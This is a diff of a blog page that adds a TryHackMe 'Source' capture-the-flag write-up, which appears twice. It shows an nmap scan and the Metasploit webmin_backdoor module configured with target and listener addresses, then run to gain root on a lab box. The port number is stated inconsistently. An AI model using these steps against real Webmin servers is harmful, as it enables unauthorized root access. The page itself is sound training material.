@@ -10,10 +10,11 @@
 
 <!-- Twitter And Open Graph Meta -->
 <!-- Open Graph Meta Tags -->
-<meta property="og:title" content="Projects">
-<meta property="og:description" content="">
+<meta property="og:title" content="TryHackMe - Source">
+<meta property="og:description" content="&lt;p&gt;Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool. Let’s start.&lt;/p&gt;
+">
 <meta property="og:type" content="website">
-<meta property="og:url" content="http://localhost:4000/projects/">
+<meta property="og:url" content="http://localhost:4000/tryhackme-source/">
 <meta property="og:image" content="">
 <meta property="og:image:alt" content="">
 <meta property="og:site_name" content="Mr0Wido's Blog">
@@ -22,8 +23,9 @@
 <!-- Twitter Meta Tags -->
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:site" content="@">
-<meta name="twitter:title" content="Projects">
-<meta name="twitter:description" content="">
+<meta name="twitter:title" content="TryHackMe - Source">
+<meta name="twitter:description" content="&lt;p&gt;Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool. Let’s start.&lt;/p&gt;
+">
 <meta name="twitter:image" content="">
 
 
@@ -31,12 +33,12 @@
 <link rel="shortcut icon" href="/assets/img/favicon.ico" type="ico">
 <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
 <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-<link rel="canonical" href="http://localhost:4000/projects/">
+<link rel="canonical" href="http://localhost:4000/tryhackme-source/">
 <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
 
 
 
-<title>Projects - Mr0Wido's Blog</title>
+<title>TryHackMe - Source - Mr0Wido's Blog</title>
 
 
 
@@ -51,7 +53,7 @@
 
 
 
-    <title>Projects - Mr0Wido's Blog</title>
+    <title>TryHackMe - Source - Mr0Wido's Blog</title>
     <link rel="stylesheet" type="text/css" href="/assets/css/main.css">
   </head>
   <body>
@@ -72,7 +74,7 @@
         <a class="site-nav__link " href="/posts/">Posts</a>
       </li>
       <li class="site-nav__item">
-        <a class="site-nav__link  active" href="/projects/">Projects</a>
+        <a class="site-nav__link " href="/projects/">Projects</a>
       </li>
       <li class="site-nav__item">
         <a class="site-nav__link " href="/cv/">CV</a>
@@ -118,7 +120,7 @@
     <li><a class="site-nav__link " href="/">Home</a></li>
     <li><a class="site-nav__link " href="/whoami/">Whoami</a></li>
     <li><a class="site-nav__link " href="/posts/">Posts</a></li>
-    <li><a class="site-nav__link  active" href="/projects/">Projects</a></li>
+    <li><a class="site-nav__link " href="/projects/">Projects</a></li>
     <li><a class="site-nav__link " href="/cv/">CV</a></li>
     <li><a class="site-nav__link " href="/categories/">Categories</a></li>
   </ul>
@@ -137,70 +139,149 @@
     <div class="container-default">
       <div class="content-container">
         <main class="default">
-          <h2 id="mr0widos-github">Mr0Wido’s Github</h2>
+          <div class="post">
+  <h1 class="post__title">TryHackMe - Source</h1>
+  <div class="post__content">
+    <p>Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool. Let’s start.</p>
 
-<div class="repositories d-flex flex-wrap flex-md-row flex-column justify-content-between align-items-center">
-  
-    <div class="repo p-2 text-center">
-  <a href="https://github.com/mr0wido" rel="external nofollow noopener" target="_blank">
-    <img class="repo-img-dark w-100" alt="mr0wido" src="https://github-readme-stats.vercel.app/api/?username=mr0wido&amp;theme=transparent&amp;show_icons=true&amp;title_color=2be4ea&amp;icon_color=fed33f&amp;text_color=e8615a&amp;bg_color=1e181e65&amp;border_color=9c3230&amp;border_radius=2&amp;custom_title=Mr0Wido's%20Github%20Stats">
-  </a>
-</div>
+<p><br></p>
 
-  
-</div>
+<h2 id="1-embark">1. Embark</h2>
+
+<p>Enumerate and root the box attached to this task. Can you discover the source of the disruption and leverage it to take control?</p>
+
+<p><br></p>
+
+<h3 id="11-usertxt">1.1 user.txt</h3>
+
+<p>Let’s do a nmap scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.11.143
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/source/nmap.png" alt="nmap"></p>
+
+<p>Two ports are open. These are <strong><code class="language-plaintext highlighter-rouge">22/tcp SSH and 1000/tcp HTTP</code></strong>.</p>
+
+<p>I am visiting the Webmin page running on port 1000. I see a page like this:</p>
+
+<p><img src="/assets/img/tryhackme/source/home.png" alt="home"></p>
+
+<p>I fix the URL as HTTP like this <a href="https://10.10.11.143:10000/" rel="external nofollow noopener" target="_blank">https://10.10.11.143:10000/</a></p>
+
+<p>The Webmin login page appears on the page.</p>
+
+<p><img src="/assets/img/tryhackme/source/login.png" alt="login"></p>
+
+<p>I tried several login attempts but it didn’t work. I’m searching for any security vulnerabilities in the version of Webmin used.</p>
+
+<p><img src="/assets/img/tryhackme/source/browse.png" alt="browse"></p>
+
+<p>I see that this version of Webmin is vulnerable.</p>
+
+<p>I decide to do a search using Metasploit.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfconsole
+$ search webmin
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/source/search.png" alt="search"></p>
+
+<p>I’ve tried most of the ones here. I can only run <strong><code class="language-plaintext highlighter-rouge">7 exploit/linux/http/webmin_backdoor</code></strong>.</p>
+
+<p>Let’s do the settings first.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ set RHOSTS 10.10.11.143
+$ set LHOST 10.8.86.168
+$ set SSL true
+$ show options
+</code></pre></div></div>
+<p><img src="/assets/img/tryhackme/source/set.png" alt="set"></p>
+
+<p>After making the settings, it should look like this.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ show options
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/source/options.png" alt="options"></p>
+
+<p>Let’s run it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ run
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/source/run.png" alt="run"></p>
+
+<p>Yes, it worked. We are inside with root privilege.</p>
+
+<p>Let’s get the user flag.</p>
+
+<p><img src="/assets/img/tryhackme/source/user-flag.png" alt="user-flag"></p>
+
+<p><br></p>
+
+<h3 id="12-roottxt">1.2 root.txt</h3>
+
+<p>Let’s get the root flag.</p>
+
+<p><img src="/assets/img/tryhackme/source/root-flag.png" alt="root-flag"></p>
+
+<p><br></p>
 
 <hr>
 
-<h2 id="github-repositories">GitHub Repositories</h2>
+<p><br></p>
 
-<div class="repositories d-flex flex-wrap flex-md-row flex-column justify-content-between align-items-center">
-  
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br></p>
+
+  </div>
+  <div class="post__footer">
+    <p class="post__date">
+      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 25, 2023</p>
+    <div class="post__categories">
+      
+      
+      <p><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: <a href="/categories/#TryHackMe">TryHackMe</a></p>
+            
+    </div>      
     
-
-
-
-<div class="repo p-2 text-center">
-  <a href="https://github.com/Mr0Wido/FrSec-Hunting-Toolkit" rel="external nofollow noopener" target="_blank">
-    <img class="repo-img-dark w-100" alt="Mr0Wido/FrSec-Hunting-Toolkit" src="https://github-readme-stats.vercel.app/api/pin/?username=Mr0Wido&amp;repo=FrSec-Hunting-Toolkit&amp;theme=transparent&amp;show_owner=true&amp;title_color=2be4ea&amp;icon_color=fed33f&amp;text_color=e8615a&amp;bg_color=1e181e65&amp;border_color=9c3230&amp;border_radius=2&amp;langs_count=5">
-  </a>
-</div>
-
-  
+    <div class="post__tags">
+      <p class="post__tags-title">
+        <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
+        <span class="post__tags-container">
+          
+          <span class="post__tags-item">easy, ctf, cve</span>
+          
+        </span>
+      </p>
+    </div>
     
-
-
-
-<div class="repo p-2 text-center">
-  <a href="https://github.com/Mr0Wido/mr0wido.github.io" rel="external nofollow noopener" target="_blank">
-    <img class="repo-img-dark w-100" alt="Mr0Wido/mr0wido.github.io" src="https://github-readme-stats.vercel.app/api/pin/?username=Mr0Wido&amp;repo=mr0wido.github.io&amp;theme=transparent&amp;show_owner=true&amp;title_color=2be4ea&amp;icon_color=fed33f&amp;text_color=e8615a&amp;bg_color=1e181e65&amp;border_color=9c3230&amp;border_radius=2&amp;langs_count=5">
-  </a>
+  </div>
 </div>
+<br>
 
-  
+
+<div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    this.page.url = 'http://localhost:4000/tryhackme-source/';
+    this.page.identifier = '/tryhackme-source';
     
+    };
+
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://mr0widos-blog.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="external nofollow noopener" target="_blank">comments powered by Disqus.</a>
+</noscript>
 
 
-
-<div class="repo p-2 text-center">
-  <a href="https://github.com/jekyll/jekyll" rel="external nofollow noopener" target="_blank">
-    <img class="repo-img-dark w-100" alt="jekyll/jekyll" src="https://github-readme-stats.vercel.app/api/pin/?username=jekyll&amp;repo=jekyll&amp;theme=transparent&amp;show_owner=true&amp;title_color=2be4ea&amp;icon_color=fed33f&amp;text_color=e8615a&amp;bg_color=1e181e65&amp;border_color=9c3230&amp;border_radius=2&amp;langs_count=5">
-  </a>
-</div>
-
-  
-    
-
-
-
-<div class="repo p-2 text-center">
-  <a href="https://github.com/Mr0Wido/Subdomain-Toolkit" rel="external nofollow noopener" target="_blank">
-    <img class="repo-img-dark w-100" alt="Mr0Wido/Subdomain-Toolkit" src="https://github-readme-stats.vercel.app/api/pin/?username=Mr0Wido&amp;repo=Subdomain-Toolkit&amp;theme=transparent&amp;show_owner=true&amp;title_color=2be4ea&amp;icon_color=fed33f&amp;text_color=e8615a&amp;bg_color=1e181e65&amp;border_color=9c3230&amp;border_radius=2&amp;langs_count=5">
-  </a>
-</div>
-
-  
-</div>
 
         </main>
       </div>
@@ -535,70 +616,149 @@
       </div>
       <div class="content-container">
         <main class="default">
-          <h2 id="mr0widos-github">Mr0Wido’s Github</h2>
+          <div class="post">
+  <h1 class="post__title">TryHackMe - Source</h1>
+  <div class="post__content">
+    <p>Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool. Let’s start.</p>
 
-<div class="repositories d-flex flex-wrap flex-md-row flex-column justify-content-between align-items-center">
-  
-    <div class="repo p-2 text-center">
-  <a href="https://github.com/mr0wido" rel="external nofollow noopener" target="_blank">
-    <img class="repo-img-dark w-100" alt="mr0wido" src="https://github-readme-stats.vercel.app/api/?username=mr0wido&amp;theme=transparent&amp;show_icons=true&amp;title_color=2be4ea&amp;icon_color=fed33f&amp;text_color=e8615a&amp;bg_color=1e181e65&amp;border_color=9c3230&amp;border_radius=2&amp;custom_title=Mr0Wido's%20Github%20Stats">
-  </a>
-</div>
+<p><br></p>
 
-  
-</div>
+<h2 id="1-embark">1. Embark</h2>
+
+<p>Enumerate and root the box attached to this task. Can you discover the source of the disruption and leverage it to take control?</p>
+
+<p><br></p>
+
+<h3 id="11-usertxt">1.1 user.txt</h3>
+
+<p>Let’s do a nmap scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.11.143
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/source/nmap.png" alt="nmap"></p>
+
+<p>Two ports are open. These are <strong><code class="language-plaintext highlighter-rouge">22/tcp SSH and 1000/tcp HTTP</code></strong>.</p>
+
+<p>I am visiting the Webmin page running on port 1000. I see a page like this:</p>
+
+<p><img src="/assets/img/tryhackme/source/home.png" alt="home"></p>
+
+<p>I fix the URL as HTTP like this <a href="https://10.10.11.143:10000/" rel="external nofollow noopener" target="_blank">https://10.10.11.143:10000/</a></p>
+
+<p>The Webmin login page appears on the page.</p>
+
+<p><img src="/assets/img/tryhackme/source/login.png" alt="login"></p>
+
+<p>I tried several login attempts but it didn’t work. I’m searching for any security vulnerabilities in the version of Webmin used.</p>
+
+<p><img src="/assets/img/tryhackme/source/browse.png" alt="browse"></p>
+
+<p>I see that this version of Webmin is vulnerable.</p>
+
+<p>I decide to do a search using Metasploit.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfconsole
+$ search webmin
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/source/search.png" alt="search"></p>
+
+<p>I’ve tried most of the ones here. I can only run <strong><code class="language-plaintext highlighter-rouge">7 exploit/linux/http/webmin_backdoor</code></strong>.</p>
+
+<p>Let’s do the settings first.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ set RHOSTS 10.10.11.143
+$ set LHOST 10.8.86.168
+$ set SSL true
+$ show options
+</code></pre></div></div>
+<p><img src="/assets/img/tryhackme/source/set.png" alt="set"></p>
+
+<p>After making the settings, it should look like this.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ show options
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/source/options.png" alt="options"></p>
+
+<p>Let’s run it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ run
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/source/run.png" alt="run"></p>
+
+<p>Yes, it worked. We are inside with root privilege.</p>
+
+<p>Let’s get the user flag.</p>
+
+<p><img src="/assets/img/tryhackme/source/user-flag.png" alt="user-flag"></p>
+
+<p><br></p>
+
+<h3 id="12-roottxt">1.2 root.txt</h3>
+
+<p>Let’s get the root flag.</p>
+
+<p><img src="/assets/img/tryhackme/source/root-flag.png" alt="root-flag"></p>
+
+<p><br></p>
 
 <hr>
 
-<h2 id="github-repositories">GitHub Repositories</h2>
+<p><br></p>
 
-<div class="repositories d-flex flex-wrap flex-md-row flex-column justify-content-between align-items-center">
-  
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br></p>
+
+  </div>
+  <div class="post__footer">
+    <p class="post__date">
+      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 25, 2023</p>
+    <div class="post__categories">
+      
+      
+      <p><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: <a href="/categories/#TryHackMe">TryHackMe</a></p>
+            
+    </div>      
     
-
-
-
-<div class="repo p-2 text-center">
-  <a href="https://github.com/Mr0Wido/FrSec-Hunting-Toolkit" rel="external nofollow noopener" target="_blank">
-    <img class="repo-img-dark w-100" alt="Mr0Wido/FrSec-Hunting-Toolkit" src="https://github-readme-stats.vercel.app/api/pin/?username=Mr0Wido&amp;repo=FrSec-Hunting-Toolkit&amp;theme=transparent&amp;show_owner=true&amp;title_color=2be4ea&amp;icon_color=fed33f&amp;text_color=e8615a&amp;bg_color=1e181e65&amp;border_color=9c3230&amp;border_radius=2&amp;langs_count=5">
-  </a>
-</div>
-
-  
+    <div class="post__tags">
+      <p class="post__tags-title">
+        <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
+        <span class="post__tags-container">
+          
+          <span class="post__tags-item">easy, ctf, cve</span>
+          
+        </span>
+      </p>
+    </div>
     
-
-
-
-<div class="repo p-2 text-center">
-  <a href="https://github.com/Mr0Wido/mr0wido.github.io" rel="external nofollow noopener" target="_blank">
-    <img class="repo-img-dark w-100" alt="Mr0Wido/mr0wido.github.io" src="https://github-readme-stats.vercel.app/api/pin/?username=Mr0Wido&amp;repo=mr0wido.github.io&amp;theme=transparent&amp;show_owner=true&amp;title_color=2be4ea&amp;icon_color=fed33f&amp;text_color=e8615a&amp;bg_color=1e181e65&amp;border_color=9c3230&amp;border_radius=2&amp;langs_count=5">
-  </a>
+  </div>
 </div>
+<br>
 
-  
+
+<div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    this.page.url = 'http://localhost:4000/tryhackme-source/';
+    this.page.identifier = '/tryhackme-source';
     
+    };
+
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://mr0widos-blog.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="external nofollow noopener" target="_blank">comments powered by Disqus.</a>
+</noscript>
 
 
-
-<div class="repo p-2 text-center">
-  <a href="https://github.com/jekyll/jekyll" rel="external nofollow noopener" target="_blank">
-    <img class="repo-img-dark w-100" alt="jekyll/jekyll" src="https://github-readme-stats.vercel.app/api/pin/?username=jekyll&amp;repo=jekyll&amp;theme=transparent&amp;show_owner=true&amp;title_color=2be4ea&amp;icon_color=fed33f&amp;text_color=e8615a&amp;bg_color=1e181e65&amp;border_color=9c3230&amp;border_radius=2&amp;langs_count=5">
-  </a>
-</div>
-
-  
-    
-
-
-
-<div class="repo p-2 text-center">
-  <a href="https://github.com/Mr0Wido/Subdomain-Toolkit" rel="external nofollow noopener" target="_blank">
-    <img class="repo-img-dark w-100" alt="Mr0Wido/Subdomain-Toolkit" src="https://github-readme-stats.vercel.app/api/pin/?username=Mr0Wido&amp;repo=Subdomain-Toolkit&amp;theme=transparent&amp;show_owner=true&amp;title_color=2be4ea&amp;icon_color=fed33f&amp;text_color=e8615a&amp;bg_color=1e181e65&amp;border_color=9c3230&amp;border_radius=2&amp;langs_count=5">
-  </a>
-</div>
-
-  
-</div>
 
         </main>
       </div>
@@ -623,17 +783,17 @@
   {
     "@context": "https://schema.org",
     "@type": "Article",
-    "headline": "Projects",
+    "headline": "TryHackMe - Source",
     "author": {
       "@type": "Person",
       "name": ""
     },
-    "datePublished": "",
+    "datePublished": "2023-03-25 00:00:00 +0300",
     "mainEntityOfPage": {
       "@type": "WebPage",
-      "@id": "http://localhost:4000/projects/"
+      "@id": "http://localhost:4000/tryhackme-source/"
     },
-    "articleSection": ""
+    "articleSection": "TryHackMe"
   }
 </script>
   </body>
